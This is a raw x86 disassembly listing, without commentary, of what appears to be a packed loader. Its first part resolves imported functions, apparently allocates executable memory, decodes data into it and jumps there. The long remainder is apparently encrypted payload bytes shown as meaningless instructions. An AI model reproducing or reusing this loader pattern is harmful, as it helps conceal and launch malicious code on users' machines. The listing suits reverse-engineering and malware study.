  4215dd:	mov    ecx,DWORD PTR ds:0x42810c
  4215e3:	mov    DWORD PTR [ebp-0x24],ecx
  4215e6:	mov    edx,DWORD PTR ds:0x428110
  4215ec:	mov    DWORD PTR [ebp-0x20],edx
  4215ef:	mov    al,ds:0x428114
  4215f4:	mov    BYTE PTR [ebp-0x1c],al
  4215f7:	mov    ecx,DWORD PTR ds:0x4280f8
  4215fd:	mov    DWORD PTR [ebp-0x40],ecx
  421600:	mov    edx,DWORD PTR ds:0x4280fc
  421606:	mov    DWORD PTR [ebp-0x3c],edx
  421609:	mov    eax,ds:0x428100
  42160e:	mov    DWORD PTR [ebp-0x38],eax
  421611:	mov    cx,WORD PTR ds:0x428104
  421618:	mov    WORD PTR [ebp-0x34],cx
  42161c:	mov    dl,BYTE PTR ds:0x428106
  421622:	mov    BYTE PTR [ebp-0x32],dl
  421625:	mov    DWORD PTR [ebp-0x30],0x40
  42162c:	lea    eax,[ebp-0x10]
  42162f:	push   eax
  421630:	lea    ecx,[ebp-0x10]
  421633:	push   ecx
  421634:	lea    edx,[ebp-0x14]
  421637:	push   edx
  421638:	call   DWORD PTR ds:0x428000
  42163e:	test   eax,eax
  421640:	je     0x42164b
  421642:	mov    eax,DWORD PTR [ebp-0x10]
  421645:	add    eax,0x1
  421648:	mov    DWORD PTR [ebp-0x10],eax
  42164b:	mov    DWORD PTR [ebp-0x48],0x0
  421652:	mov    DWORD PTR [ebp-0x4c],0x0
  421659:	push   0x1
  42165b:	lea    ecx,[ebp-0x14]
  42165e:	push   ecx
  42165f:	call   DWORD PTR ds:0x428004
  421665:	mov    BYTE PTR [ebp-0x40],0x56
  421669:	call   DWORD PTR ds:0x428014
  42166f:	mov    DWORD PTR [ebp-0x2c],eax
  421672:	mov    BYTE PTR [ebp-0x3e],0x72
  421676:	movzx  edx,WORD PTR [ebp-0x2c]
  42167a:	test   edx,edx
  42167c:	jne    0x4216be
  42167e:	mov    BYTE PTR [ebp-0x34],0x0
  421682:	mov    DWORD PTR [ebp-0x14],0xe0d
  421689:	lea    eax,[ebp-0x28]
  42168c:	push   eax
  42168d:	call   DWORD PTR ds:0x428018
  421693:	mov    DWORD PTR [ebp-0x68],eax
  421696:	mov    DWORD PTR [ebp-0x5c],0x3a
  42169d:	lea    ecx,[ebp-0x40]
  4216a0:	push   ecx
  4216a1:	mov    edx,DWORD PTR [ebp-0x68]
  4216a4:	push   edx
  4216a5:	call   DWORD PTR ds:0x42801c
  4216ab:	mov    DWORD PTR [ebp-0x44],eax
  4216ae:	mov    DWORD PTR [ebp-0x8],0xdc466f6d
  4216b5:	mov    DWORD PTR [ebp-0x70],0x10c93f
  4216bc:	jmp    0x4216d3
  4216be:	mov    BYTE PTR ds:0x443a58,0x0
  4216c5:	mov    BYTE PTR ds:0x42bb88,0x0
  4216cc:	mov    BYTE PTR ds:0x441b18,0x0
  4216d3:	mov    DWORD PTR [ebp-0x2c],0x410000
  4216da:	push   DWORD PTR ds:0x428018
  4216e0:	pop    edx
  4216e1:	mov    DWORD PTR [ebp-0x74],edx
  4216e4:	push   DWORD PTR [ebp-0x30]
  4216e7:	push   0x1000
  4216ec:	mov    eax,DWORD PTR [ebp-0x14]
  4216ef:	add    eax,0x23
  4216f2:	add    eax,0x23
  4216f5:	push   eax
  4216f6:	xor    eax,eax
  4216f8:	push   eax
  4216f9:	mov    ecx,DWORD PTR [ebp-0x44]
  4216fc:	call   ecx
  4216fe:	mov    edx,eax
  421700:	mov    DWORD PTR [ebp-0x4],edx
  421703:	mov    eax,DWORD PTR [ebp-0x70]
  421706:	sub    eax,0xdae0b
  42170b:	mov    DWORD PTR [ebp-0x70],eax
  42170e:	cmp    DWORD PTR [ebp-0x4],0x0
  421712:	jne    0x42171b
  421714:	mov    BYTE PTR ds:0x441b18,0x0
  42171b:	mov    ecx,DWORD PTR [ebp-0x4]
  42171e:	add    ecx,DWORD PTR [ebp-0x14]
  421721:	mov    edx,DWORD PTR [ebp-0x8]
  421724:	mov    DWORD PTR [ecx],edx
  421726:	mov    eax,DWORD PTR [ebp-0x4]
  421729:	add    eax,DWORD PTR [ebp-0x5c]
  42172c:	mov    DWORD PTR [ebp-0x64],eax
  42172f:	mov    ecx,DWORD PTR ds:0x42801c
  421735:	mov    DWORD PTR [ebp-0x54],ecx
  421738:	mov    edx,DWORD PTR [ebp-0x4]
  42173b:	add    edx,DWORD PTR [ebp-0x14]
  42173e:	mov    eax,DWORD PTR [ebp+0x8]
  421741:	mov    DWORD PTR [edx+0x4],eax
  421744:	mov    ecx,DWORD PTR [ebp-0x4]
  421747:	add    ecx,DWORD PTR [ebp-0x14]
  42174a:	mov    DWORD PTR [ebp-0xc],ecx
  42174d:	cmp    DWORD PTR [ebp-0x70],0x0
  421751:	jbe    0x42176e
  421753:	mov    edx,DWORD PTR [ebp-0xc]
  421756:	push   edx
  421757:	mov    eax,DWORD PTR [ebp-0x14]
  42175a:	push   eax
  42175b:	mov    ecx,DWORD PTR [ebp-0x2c]
  42175e:	add    ecx,DWORD PTR [ebp-0x70]
  421761:	push   ecx
  421762:	mov    edx,DWORD PTR [ebp-0x4]
  421765:	push   edx
  421766:	call   0x4214d0
  42176b:	add    esp,0x10
  42176e:	cmp    DWORD PTR [ebp-0x64],0x0
  421772:	je     0x421786
  421774:	mov    ecx,DWORD PTR [ebp-0x54]
  421777:	push   ecx
  421778:	push   DWORD PTR [ebp-0x74]
  42177b:	mov    esi,DWORD PTR [ebp-0x64]
  42177e:	push   edx
  42177f:	pop    eax
  421780:	push   ecx
  421781:	nop
  421782:	jmp    esi
  421784:	jmp    0x42178c
  421786:	mov    eax,DWORD PTR [ebp+0x8]
  421789:	mov    DWORD PTR [ebp-0x18],eax
  42178c:	mov    eax,0x1
  421791:	pop    esi
  421792:	mov    esp,ebp
  421794:	pop    ebp
  421795:	ret    
  421796:	int3   
  421797:	int3   
  421798:	int3   
  421799:	int3   
  42179a:	int3   
  42179b:	int3   
  42179c:	int3   
  42179d:	int3   
  42179e:	int3   
  42179f:	int3   
  4217a0:	push   ebp
  4217a1:	mov    ebp,esp
  4217a3:	sub    esp,0x8
  4217a6:	mov    eax,ds:0x428014
  4217ab:	push   0x0
  4217ad:	push   0xb2
  4217b2:	push   0x82
  4217b7:	push   0x0
  4217b9:	push   0xffffffff
  4217bb:	mov    DWORD PTR [ebp-0x4],0x0
  4217c2:	mov    DWORD PTR [ebp-0x8],eax
  4217c5:	call   DWORD PTR ds:0x428010
  4217cb:	push   DWORD PTR [ebp-0x8]
  4217ce:	pop    edx
  4217cf:	call   edx
  4217d1:	push   eax
  4217d2:	pop    DWORD PTR [ebp-0x4]
  4217d5:	mov    eax,DWORD PTR [ebp-0x4]
  4217d8:	dec    eax
  4217d9:	cmp    eax,0x56
  4217dc:	jne    0x4217eb
  4217de:	push   0x673b4f62
  4217e3:	call   0x421550
  4217e8:	add    esp,0x4
  4217eb:	xor    eax,eax
  4217ed:	mov    esp,ebp
  4217ef:	pop    ebp
  4217f0:	ret    
  4217f1:	nop
  4217f2:	nop
  4217f3:	nop
  4217f4:	nop
  4217f5:	nop
  4217f6:	nop
  4217f7:	nop
  4217f8:	nop
  4217f9:	nop
  4217fa:	nop
  4217fb:	nop
  4217fc:	nop
  4217fd:	nop
  4217fe:	nop
  4217ff:	nop
  421800:	sub    esp,0x10
  421803:	lea    eax,[esp+0x0]
  421807:	push   eax
  421808:	call   DWORD PTR ds:0x42800c
  42180e:	cmp    WORD PTR [esp+0x0],0x0
  421814:	je     0x42182d
  421816:	push   0x0
  421818:	call   0x4217a0
  42181d:	add    esp,0x4
  421820:	call   0x411000
  421825:	xor    eax,eax
  421827:	add    esp,0x10
  42182a:	ret    0x10
  42182d:	push   DWORD PTR [edx+0x5f25148f]
  421833:	sub    esi,esp
  421835:	and    al,0xce
  421837:	xor    ebx,DWORD PTR [edx-0x2aff82c3]
  42183d:	test   BYTE PTR [ebp+0x24f42b5c],bl
  421843:	retf   0x9a33
  421846:	jge    0x4217ca
  421848:	call   ebp
  42184a:	test   BYTE PTR ds:0x24f42b5c,ah
  421850:	retf   0x9a33
  421853:	cmp    eax,0x84d5ff82
  421858:	and    eax,0x24f42b5c
  42185d:	retf   0x9a33
  421860:	cmp    eax,0x84d5ff82
  421865:	and    eax,0x24f42b5c
  42186a:	xor    dh,BYTE PTR [ebx]
  42186c:	call   0x258a:0x6fe08c3d
  421873:	call   0x7247519a
  421878:	xor    dl,dh
  42187a:	lock mov ds:0x56edbdab,eax
  421880:	jl     0x4218dd
  421882:	xchg   BYTE PTR [ebx-0x53],cl
  421885:	inc    ecx
  421886:	sti    
  421887:	push   eax
  421888:	mov    ds:0x4beab49c,al
  42188d:	xor    ebx,DWORD PTR [edi-0x2c]
  421890:	inc    esi
  421891:	scas   eax,DWORD PTR es:[edi]
  421892:	adc    ebp,eax
  421894:	dec    eax
  421895:	in     al,dx
  421896:	fistp  QWORD PTR [edx+ebp*8-0x589be7fb]
  42189d:	add    al,0xa7
  42189f:	pop    esp
  4218a0:	(bad)  
  4218a1:	pop    eax
  4218a2:	lods   al,BYTE PTR ds:[esi]
  4218a3:	repnz fmul DWORD PTR [esi-0xbd4a3ff]
  4218aa:	and    al,0xca
  4218ac:	xor    ebx,DWORD PTR [edx-0x73fce4c6]
  4218b2:	(bad)  
  4218b3:	(bad)  
  4218b5:	and    DWORD PTR [edi-0x26c6a724],esi
  4218bb:	lds    edx,FWORD PTR [eax]
  4218bd:	cmc    
  4218be:	(bad)  
  4218bf:	loope  0x4218ea
  4218c1:	push   esi
  4218c2:	je     0x4218d0
  4218c4:	mov    dh,0xc0
  4218c6:	imul   edi,edi,0x5
  4218c9:	mov    BYTE PTR ds:0x42f162d,bh
  4218cf:	dec    esi
  4218d0:	int    0x2e
  4218d2:	mov    ds:0xae3708cb,al
  4218d7:	jno    0x4218c5
  4218d9:	mov    fs,WORD PTR [ebx-0x5c]
  4218dc:	mov    ecx,0x224a6efe
  4218e1:	nop
  4218e2:	ja     0x42195e
  4218e4:	ins    DWORD PTR es:[edi],dx
  4218e5:	(bad)  
  4218e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4218e8:	pop    ebp
  4218e9:	and    DWORD PTR [esp+ebx*8-0x3a26c6a8],ebp
  4218f0:	adc    ebp,esi
  4218f2:	std    
  4218f3:	jge    0x4218ac
  4218f5:	push   esi
  4218f6:	xchg   esp,eax
  4218f7:	sub    al,0xa4
  4218f9:	sar    BYTE PTR [esi+0x62],0xaf
  4218fd:	mov    BYTE PTR [edi+0x542fb9b0],ah
  421903:	shl    DWORD PTR [esi+0x2e],cl
  421906:	xchg   edx,eax
  421907:	push   esi
  421908:	xchg   edx,eax
  421909:	aaa    
  42190a:	rol    BYTE PTR [edi],0x47
  42190d:	mov    ?,WORD PTR [ebp+0x39]
  421910:	and    al,0xfe
  421912:	data16 xor ah,BYTE PTR [ecx-0x63149070]
  421919:	mov    ebp,0x21ceddc7
  42191e:	hlt    
  42191f:	and    al,0xca
  421921:	xor    ebx,DWORD PTR [edx-0x7a007dc3]
  421927:	shl    DWORD PTR ds:0x26f5675c,0xca
  42192e:	xchg   ebx,eax
  42192f:	dec    edx
  421930:	push   esi
  421931:	int    0xff
  421933:	aad    0x84
  421935:	and    eax,0x24f42b5c
  42193a:	sub    dh,BYTE PTR [ebx]
  42193c:	cdq    
  42193d:	cmp    al,0x89
  42193f:	(bad)  
  421940:	fild   WORD PTR [ebp+eiz*1+0x24f42fb2]
  421947:	jbe    0x42197e
  421949:	call   0x9895:0xd5ff823d
  421950:	pop    esp
  421951:	sub    esi,esp
  421953:	xor    al,0xca
  421955:	xor    ebx,DWORD PTR [edx-0x2a0078c3]
  42195b:	test   BYTE PTR [esp+ebx*2+0x2b],ah
  42195f:	in     al,0x24
  421961:	retf   0x9833
  421964:	cmp    eax,0x85d5fa82
  421969:	and    eax,0x24f42b5c
  42196e:	iret   
  42196f:	xor    ebx,DWORD PTR [ebx-0x2a007dc3]
  421975:	test   BYTE PTR ds:0x24f4270c,ah
  42197b:	into   
  42197c:	xor    ebx,DWORD PTR [edx-0x2a0599c4]
  421982:	xchg   BYTE PTR ds:0x24f4ab5c,ah
  421988:	fidiv  DWORD PTR [ebx]
  42198a:	call   0x3584:0xd5ff822d
  421991:	pop    esp
  421992:	sub    esp,esp
  421994:	and    al,0xca
  421996:	xor    ebx,DWORD PTR [edx-0x2a107dc3]
  42199c:	test   BYTE PTR ds:0x24f42b5c,ah
  4219a2:	retf   0x9a33
  4219a5:	cmp    eax,0x84d9c676
  4219aa:	dec    esp
  4219ab:	pop    edi
  4219ac:	sub    esi,esp
  4219ae:	and    al,0x3a
  4219b0:	cmp    BYTE PTR [edx-0x2a00348e],bl
  4219b6:	test   BYTE PTR ds:0x24f42b5c,ah
  4219bc:	retf   0x9a33
  4219bf:	cmp    eax,0x84d5ff82
  4219c4:	and    eax,0x24f42b5c
  4219c9:	retf   0x9a33
  4219cc:	cmp    eax,0x84d5ff82
  4219d1:	and    eax,0x24f42b5c
  4219d6:	retf   0x9a33
  4219d9:	cmp    eax,0x84d5ff82
  4219de:	and    eax,0x24f42b5c
  4219e3:	retf   0x9a33
  4219e6:	cmp    eax,0x84d5ff82
  4219eb:	and    eax,0x24f42b5c
  4219f0:	retf   0x9a33
  4219f3:	cmp    eax,0x84d5ff82
  4219f8:	and    eax,0x24f42b5c
  4219fd:	retf   0x9a33
  421a00:	cmp    eax,0x84d5ff82
  421a05:	and    eax,0x24f42b5c
  421a0a:	retf   0x9a33
  421a0d:	cmp    eax,0x84d5ff82
  421a12:	and    eax,0x24f42b5c
  421a17:	retf   0x9a33
  421a1a:	cmp    eax,0xaad5ff82
  421a1f:	push   ecx
  421a20:	cmp    DWORD PTR [ebx-0x80],edx
  421a23:	and    al,0xca
  421a25:	xor    ebx,DWORD PTR [edx-0x2a007623]
  421a2b:	xchg   esp,eax
  421a2c:	and    eax,0x20202b5c
  421a31:	retf   0x9e33
  421a34:	cmp    eax,0xc790af82
  421a39:	pop    ss
  421a3a:	or     BYTE PTR [esp+esi*8+0x24],ah
  421a3e:	retf   0x9a33
  421a41:	cmp    eax,0x64d5ffa2
  421a46:	or     ebp,DWORD PTR [esi]
  421a48:	pop    eax
  421a49:	xchg   BYTE PTR [edi-0x36],al
  421a4c:	xor    ebx,DWORD PTR [edx-0x2a001dc3]
  421a52:	test   ch,dl
  421a54:	push   edi
  421a55:	sub    esi,esp
  421a57:	jle    0x421a23
  421a59:	xor    ebx,DWORD PTR [edx-0x2a00791b]
  421a5f:	test   BYTE PTR ds:0x24f42b5c,ah
  421a65:	retf   0x9a33
  421a68:	cmp    eax,0x84d5df82
  421a6d:	lds    ebx,FWORD PTR [ebx+ebp*1-0xc]
  421a71:	and    al,0xca
  421a73:	xor    ebx,DWORD PTR [edx-0x2a007dc3]
  421a79:	test   BYTE PTR ds:0x24f42b5c,ah
  421a7f:	retf   0x9a33
  421a82:	cmp    eax,0x84d5ff82
  421a87:	and    eax,0x24f42b5c
  421a8c:	retf   0x9a33
  421a8f:	cmp    eax,0x84d5ff82
  421a94:	and    eax,0x24f42b5c
  421a99:	retf   0x9a33
  421a9c:	cmp    eax,0x84d5ff82
  421aa1:	and    eax,0x24f42b5c
  421aa6:	retf   0x9a33
  421aa9:	cmp    eax,0x84d5ff82
  421aae:	and    eax,0x24f42b5c
  421ab3:	retf   0x9a33
  421ab6:	cmp    eax,0x84d5ff82
  421abb:	and    eax,0x24f42b5c
  421ac0:	retf   0x9a33
  421ac3:	cmp    eax,0x84d5ff82
  421ac8:	and    eax,0x24f42b5c
  421acd:	retf   0x9a33
  421ad0:	cmp    eax,0x84d5ff82
  421ad5:	and    eax,0x24f42b5c
  421ada:	retf   0x9a33
  421add:	cmp    eax,0x84d5ff82
  421ae2:	and    eax,0x24f42b5c
  421ae7:	retf   0x9a33
  421aea:	cmp    eax,0x84d5ff82
  421aef:	and    eax,0x24f42b5c
  421af4:	retf   0x9a33
  421af7:	cmp    eax,0x84d5ff82
  421afc:	and    eax,0x24f42b5c
  421b01:	retf   0x9a33
  421b04:	cmp    eax,0x84d5ff82
  421b09:	and    eax,0x24f42b5c
  421b0e:	retf   0x9a33
  421b11:	cmp    eax,0x84d5ff82
  421b16:	and    eax,0x24f42b5c
  421b1b:	retf   0x9a33
  421b1e:	cmp    eax,0x84d5ff82
  421b23:	and    eax,0x24f42b5c
  421b28:	retf   0x9a33
  421b2b:	cmp    eax,0x84d5ff82
  421b30:	and    eax,0x24f42b5c
  421b35:	retf   0x9a33
  421b38:	cmp    eax,0x84d5ff82
  421b3d:	and    eax,0x24f42b5c
  421b42:	retf   0x9a33
  421b45:	cmp    eax,0x84d5ff82
  421b4a:	and    eax,0x24f42b5c
  421b4f:	retf   0x9a33
  421b52:	cmp    eax,0x84d5ff82
  421b57:	and    eax,0x24f42b5c
  421b5c:	retf   0x9a33
  421b5f:	cmp    eax,0x84d5ff82
  421b64:	and    eax,0x24f42b5c
  421b69:	retf   0x9a33
  421b6c:	cmp    eax,0x84d5ff82
  421b71:	and    eax,0x24f42b5c
  421b76:	retf   0x9a33
  421b79:	cmp    eax,0x84d5ff82
  421b7e:	and    eax,0x24f42b5c
  421b83:	retf   0x9a33
  421b86:	cmp    eax,0x84d5ff82
  421b8b:	and    eax,0x24f42b5c
  421b90:	retf   0x9a33
  421b93:	cmp    eax,0x84d5ff82
  421b98:	and    eax,0x24f42b5c
  421b9d:	retf   0x9a33
  421ba0:	cmp    eax,0x84d5ff82
  421ba5:	and    eax,0x24f42b5c
  421baa:	retf   0x9a33
  421bad:	cmp    eax,0x84d5ff82
  421bb2:	and    eax,0x24f42b5c
  421bb7:	retf   0x9a33
  421bba:	cmp    eax,0x84d5ff82
  421bbf:	and    eax,0x24f42b5c
  421bc4:	retf   0x9a33
  421bc7:	cmp    eax,0x84d5ff82
  421bcc:	and    eax,0x24f42b5c
  421bd1:	retf   0x9a33
  421bd4:	cmp    eax,0x84d5ff82
  421bd9:	and    eax,0x24f42b5c
  421bde:	retf   0x9a33
  421be1:	cmp    eax,0x84d5ff82
  421be6:	and    eax,0x24f42b5c
  421beb:	retf   0x9a33
  421bee:	cmp    eax,0x84d5ff82
  421bf3:	and    eax,0x24f42b5c
  421bf8:	retf   0x9a33
  421bfb:	cmp    eax,0x84d5ff82
  421c00:	and    eax,0x24f42b5c
  421c05:	retf   0x9a33
  421c08:	cmp    eax,0x84d5ff82
  421c0d:	and    eax,0x24f42b5c
  421c12:	retf   0x9a33
  421c15:	cmp    eax,0x84d5ff82
  421c1a:	and    eax,0x24f42b5c
  421c1f:	retf   0x9a33
  421c22:	cmp    eax,0x84d5ff82
  421c27:	and    eax,0x24f42b5c
  421c2c:	retf   0xf533
  421c2f:	xchg   ebp,eax
  421c30:	mov    edi,edi
  421c32:	cli    
  421c33:	test   BYTE PTR ds:0xef42b4c,ah
  421c39:	push   0x7d5bebe9
  421c3e:	ror    BYTE PTR [ebx+0x3],cl
  421c41:	jne    0x421bf4
  421c43:	sbb    eax,0xa67e371c
  421c48:	cld    
  421c49:	dec    esp
  421c4a:	push   es
  421c4b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421c4c:	(bad)  
  421c4d:	xor    eax,0x10464a92
  421c52:	scas   al,BYTE PTR es:[edi]
  421c53:	dec    ebx
  421c54:	cmc    
  421c55:	mov    ah,0x5f
  421c57:	adc    al,al
  421c59:	in     al,dx
  421c5a:	mov    bh,0x6a
  421c5c:	in     eax,dx
  421c5d:	cmp    al,0xd6
  421c5f:	and    al,0xed
  421c61:	xchg   esp,eax
  421c62:	adc    ch,BYTE PTR [eax-0x2d]
  421c65:	xchg   edx,eax
  421c66:	jl     0x421c1e
  421c68:	sbb    BYTE PTR [ecx-0x3abbbac1],al
  421c6e:	in     eax,dx
  421c6f:	mov    esi,0x102cce86
  421c74:	stos   DWORD PTR es:[edi],eax
  421c75:	ffree  st(2)
  421c77:	and    DWORD PTR [ebx],ebx
  421c79:	inc    eax
  421c7a:	jmp    0x90d2:0x28cc9590
  421c81:	cld    
  421c82:	arpl   WORD PTR ds:0x8c953a68,cx
  421c88:	sbb    ah,bh
  421c8a:	mov    al,ds:0x8337a503
  421c8f:	xchg   ecx,eax
  421c90:	ficomp WORD PTR [eax]
  421c92:	lahf   
  421c93:	shr    bl,0xc3
  421c96:	sti    
  421c97:	mov    dh,0xe2
  421c99:	pop    ecx
  421c9a:	shr    DWORD PTR [eax-0x40fc083e],0xc3
  421ca1:	cmc    
  421ca2:	xchg   ebx,eax
  421ca3:	and    DWORD PTR [edx+0x30],0x5e389345
  421caa:	jne    0x421d15
  421cac:	fcmovu st,st(3)
  421cae:	sti    
  421caf:	add    dl,BYTE PTR [esi-0x76]
  421cb2:	lea    edx,[ecx+0x7198da77]
  421cb8:	and    DWORD PTR [ecx+0x157a5fe0],esi
  421cbe:	push   cs
  421cbf:	out    0xec,al
  421cc1:	mov    eax,ds:0x771e0d03
  421cc6:	jb     0x421c61
  421cc8:	out    0xc1,eax
  421cca:	nop
  421ccb:	mov    cl,0xd3
  421ccd:	out    0x66,eax
  421ccf:	or     BYTE PTR [edx-0x521124ea],0x8a
  421cd6:	jl     0x421c5a
  421cd8:	adc    DWORD PTR [edx*1-0x35f60193],esi
  421cdf:	fidivr DWORD PTR [ebx+0x4e]
  421ce2:	cli    
  421ce3:	es mov al,0x3a
  421ce6:	not    DWORD PTR [edi+eiz*1-0x1731e4cc]
  421ced:	aas    
  421cee:	fadd   st,st(3)
  421cf0:	sub    eax,0x4b5fff18
  421cf5:	imul   BYTE PTR [ebx-0x76]
  421cf8:	cmp    edx,0x7b
  421cfb:	or     al,0x9c
  421cfd:	std    
  421cfe:	inc    esi
  421cff:	test   eax,0x72e88595
  421d04:	sub    ebx,DWORD PTR [ebx]
  421d06:	fist   WORD PTR [edi+esi*1+0x41]
  421d0a:	sahf   
  421d0b:	daa    
  421d0c:	stos   BYTE PTR es:[edi],al
  421d0d:	or     bh,ah
  421d0f:	mov    BYTE PTR [edx+edx*8+0x24],ch
  421d13:	cmp    DWORD PTR [eax+0x75cd2c36],edi
  421d19:	ins    DWORD PTR es:[edi],dx
  421d1a:	jb     0x421d93
  421d1c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421d1d:	outs   dx,DWORD PTR ds:[esi]
  421d1e:	xor    al,0xa8
  421d20:	not    DWORD PTR ds:0x83efa804
  421d26:	sbb    edi,edi
  421d28:	mov    ch,0x3c
  421d2a:	mov    eax,0xc71084a6
  421d2f:	ja     0x421d7d
  421d31:	pop    edi
  421d32:	dec    ebp
  421d33:	retf   0x4b26
  421d36:	push   ebx
  421d37:	cmp    edx,DWORD PTR cs:[edi]
  421d3a:	loop   0x421da6
  421d3c:	or     dl,BYTE PTR gs:0x5c339a54
  421d43:	stos   DWORD PTR es:[edi],eax
  421d44:	and    BYTE PTR [edi-0x34],bh
  421d47:	xlat   BYTE PTR ds:[ebx]
  421d48:	sti    
  421d49:	cmp    BYTE PTR [ecx+0x30],bh
  421d4c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421d4d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421d4e:	(bad)  
  421d4f:	mov    dl,0xe0
  421d51:	sbb    eax,0x9d2a8825
  421d56:	jg     0x421d75
  421d58:	ret    0x320d
  421d5b:	pop    es
  421d5c:	test   DWORD PTR [ecx],edx
  421d5e:	inc    ebp
  421d5f:	adc    al,0xa7
  421d61:	mov    eax,ds:0x428ba132
  421d66:	jge    0x421d7b
  421d68:	pop    eax
  421d69:	mov    eax,0xfddc3524
  421d6e:	cmp    bh,BYTE PTR [edx]
  421d70:	and    DWORD PTR [eax-0x39],esi
  421d73:	out    dx,eax
  421d74:	jae    0x421dc4
  421d76:	retf   
  421d77:	add    bl,dl
  421d79:	cmc    
  421d7a:	and    bl,bh
  421d7c:	mov    eax,0xf3bffb8e
  421d81:	iret   
  421d82:	mov    edx,0xbe23a8d0
  421d87:	push   edx
  421d88:	add    eax,0xeea18cc4
  421d8d:	test   DWORD PTR [ecx],ebp
  421d8f:	inc    esi
  421d90:	mov    bl,0xf1
  421d92:	popa   
  421d93:	(bad)  
  421d94:	xor    al,0x24
  421d96:	stos   DWORD PTR es:[edi],eax
  421d97:	mov    dh,0x8d
  421d99:	sub    ah,BYTE PTR [edx+0x68]
  421d9c:	test   BYTE PTR [ebx+0x16],dh
  421d9f:	lods   eax,DWORD PTR ds:[esi]
  421da0:	jecxz  0x421dd3
  421da2:	pop    esp
  421da3:	inc    ebp
  421da4:	inc    edi
  421da5:	jne    0x421d56
  421da7:	xor    BYTE PTR [ebx-0x45614dba],bh
  421dad:	push   ebx
  421dae:	std    
  421daf:	out    dx,eax
  421db0:	mov    dh,BYTE PTR [ecx-0x12]
  421db3:	fs into 
  421db5:	adc    BYTE PTR [esi+esi*2-0x986e68b],cl
  421dbc:	cli    
  421dbd:	std    
  421dbe:	and    ah,ah
  421dc0:	inc    eax
  421dc1:	and    eax,0xaab7f2c3
  421dc6:	xor    dh,BYTE PTR [edx+edx*1-0x45d3bc81]
  421dcd:	inc    ecx
  421dce:	pop    ebp
  421dcf:	jnp    0x421d57
  421dd1:	(bad)  [edi+ebp*1-0x21cdc0f9]
  421dd8:	sbb    DWORD PTR ds:0xeb84e4d5,esp
  421dde:	jge    0x421dbe
  421de0:	rol    DWORD PTR [ebx+0x2d],0xad
  421de4:	data16 (bad) [ebx+0x54d1e092]
  421deb:	fstp   QWORD PTR [esi+0x343db7f9]
  421df1:	mov    cl,0x2a
  421df3:	ss xor ah,BYTE PTR ds:[ebx+0x1490fd08]
  421dfb:	pop    ebp
  421dfc:	pop    esp
  421dfd:	jle    0x421d9c
  421dff:	mov    ds:0xa3bbe50e,eax
  421e04:	pop    ecx
  421e05:	jb     0x421dd9
  421e07:	adc    bh,bh
  421e09:	jmp    0x421e48
  421e0b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421e0c:	mov    edi,0x3907e575
  421e11:	in     al,dx
  421e12:	xchg   edi,eax
  421e13:	outs   dx,DWORD PTR ds:[esi]
  421e14:	out    dx,al
  421e15:	int    0x6
  421e17:	push   edi
  421e18:	sub    al,0x7e
  421e1a:	pop    esi
  421e1c:	sbb    esp,DWORD PTR [edx+0x352cccd1]
  421e22:	mov    ss,WORD PTR [eax]
  421e24:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421e25:	and    ebx,ebp
  421e27:	mov    ecx,0x6015e3f1
  421e2c:	repnz cmp BYTE PTR [ecx],bl
  421e2f:	test   eax,0x568ffa92
  421e34:	inc    edx
  421e35:	dec    ebx
  421e36:	adc    dh,cl
  421e38:	jns    0x421e00
  421e3a:	sbb    al,0x4
  421e3c:	rcr    BYTE PTR [edi+0x41],0x0
  421e40:	push   0xfba92c07
  421e45:	mov    ebx,0xe6987fe6
  421e4a:	(bad)  
  421e4c:	jnp    0x421de6
  421e4e:	rcr    DWORD PTR [edi],0x88
  421e51:	sub    al,0x2d
  421e53:	mov    cl,0x90
  421e55:	sbb    al,0xb
  421e57:	or     dh,dh
  421e59:	mov    ecx,0x7b2db910
  421e5e:	jle    0x421dee
  421e60:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421e61:	xor    eax,0xc7e9398
  421e66:	int3   
  421e67:	cmp    al,BYTE PTR [ebp+0x72]
  421e6a:	and    al,0x5e
  421e6c:	mul    dl
  421e6e:	pop    esp
  421e6f:	mov    al,0xf3
  421e71:	retf   
  421e72:	hlt    
  421e73:	stos   DWORD PTR es:[edi],eax
  421e74:	aaa    
  421e75:	fdiv   DWORD PTR [ebp+0x4c]
  421e78:	and    BYTE PTR [ebx+0x3b],dl
  421e7b:	test   BYTE PTR [ebp-0x7c],ch
  421e7e:	sbb    DWORD PTR [ebx],edx
  421e80:	repnz sub esi,DWORD PTR [ecx-0x9e42568]
  421e87:	lea    esp,es:[edi]
  421e8a:	ds push ds
  421e8c:	sub    ah,BYTE PTR [edx+0xb6cc6f8]
  421e92:	or     eax,0xb9c89a28
  421e97:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421e99:	aad    0xff
  421e9b:	adc    dl,cl
  421e9d:	push   eax
  421e9e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421e9f:	fidivr DWORD PTR [ebx+0x5c]
  421ea2:	and    ebx,edi
  421ea4:	xor    BYTE PTR ds:0x5223a4d5,ah
  421eaa:	cld    
  421eab:	rcl    BYTE PTR [edx-0x746eaa7],cl
  421eb1:	fchs   
  421eb3:	imul   esp,DWORD PTR [ebp-0x10],0xfffffff0
  421eb7:	cmp    BYTE PTR [eax],ah
  421eb9:	sub    DWORD PTR [eax],esp
  421ebb:	test   BYTE PTR [ecx],bl
  421ebd:	loop   0x421e50
  421ebf:	sub    cl,al
  421ec1:	fs pop ebx
  421ec3:	and    ebx,0x7b3a45d0
  421ec9:	es push 0xb8ac434f
  421ecf:	mov    ds:0x6c7d2c85,al
  421ed4:	das    
  421ed5:	test   DWORD PTR [ebx-0x7c],0x8381c598
  421edc:	scas   al,BYTE PTR es:[edi]
  421edd:	sar    BYTE PTR [ebx+0x17c33498],1
  421ee3:	dec    DWORD PTR [ecx+edx*8+0x1f]
  421ee7:	bound  ecx,QWORD PTR [edi+0x77]
  421eea:	sahf   
  421eeb:	lahf   
  421eec:	stos   BYTE PTR es:[edi],al
  421eed:	xchg   esi,eax
  421eee:	cdq    
  421eef:	(bad)  
  421ef0:	xor    BYTE PTR [ebx+0x79e5395c],dl
  421ef6:	dec    ecx
  421ef7:	fdivr  QWORD PTR [esi+0x54]
